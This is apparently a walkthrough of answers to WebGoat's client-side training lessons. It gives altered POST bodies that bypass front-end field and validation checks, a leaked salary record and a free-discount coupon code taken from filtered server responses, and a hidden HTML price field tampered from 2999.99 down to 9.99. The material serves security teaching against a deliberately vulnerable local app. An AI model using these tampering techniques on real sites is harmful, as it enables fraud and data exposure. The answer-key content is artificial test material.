<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**  *generated with [DocToc](https://github.com/thlorenz/doctoc)*

- [Client side](#client-side)
  - [Bypass front-end restrictions](#bypass-front-end-restrictions)
  - [Client side filtering](#client-side-filtering)
  - [HTML tampering](#html-tampering)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

# Client side

## Bypass front-end restrictions

### 1. Concept

### 2. Field Restrictions

Original POST body:

```
select=option2&radio=option2&checkbox=on&shortInput=12345
```

Altered POST body:

```
select=option3&radio=option3&checkbox=alfa&shortInput=123456
```

### 3. Validation

Original POST body:

```
field1=abc&field2=123&field3=abc+123+ABC&field4=seven&field5=01101&field6=90210-1111&field7=301-604-4882&error=0
```

Altered POST body:

```
field1=abcd&field2=1234&field3=abc+123+ABC.&field4=seventy&field5=01101alfa&field6=90210-1111-beta&field7=301-604-4882-gamma&error=0
```

## Client side filtering

### Client side filtering

### Salary manager

Server response contains:

```
...
{
  "Salary" : "450000",
  "UserID" : "112",
  "FirstName" : "Neville",
  "LastName" : "Bartholomew",
  "SSN" : "111-111-1111"
}
...
```

### Smarthone online shop

`GET http://localhost:8080/WebGoat/clientSideFiltering/challenge-store/coupons/ HTTP/1.1` returns discount codes

```
...
{
    "code" : "get_it_for_free",
    "discount" : 100
}
...
```

## HTML tampering

### Concept

### Try it yourself

Original HTML:

```
<input id="Total" name="Total" type="HIDDEN" value="2999.99">
```

Altered HTML:

```
<input id="Total" name="Total" type="HIDDEN" value="9.99">
```

### Mitigation

Never trust input sent by a client.